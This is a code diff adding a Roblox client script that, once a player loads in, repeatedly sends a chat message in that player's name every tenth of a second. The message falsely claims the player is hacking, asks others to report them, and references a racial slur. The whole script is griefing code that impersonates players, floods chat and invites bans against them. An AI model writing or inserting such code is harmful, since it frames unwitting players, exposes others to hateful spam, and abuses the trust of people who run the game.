@@ -1,0 +1,15 @@
+-- StarterPlayerScripts/SayOnLoad.lua
+-- Makes the player auto-say something when they load in
+
+local TextChatService = game:GetService("TextChatService")
+
+-- the message you want the player to say
+local MESSAGE = "IM HACKING REPORT ME! N-word"
+
+-- wait a sec to make sure chat loads
+task.wait(2)
+
+-- send the message as if the player typed it
+while task.wait(0.1) do
+TextChatService.TextChannels.RBXGeneral:SendAsync(MESSAGE)
+end
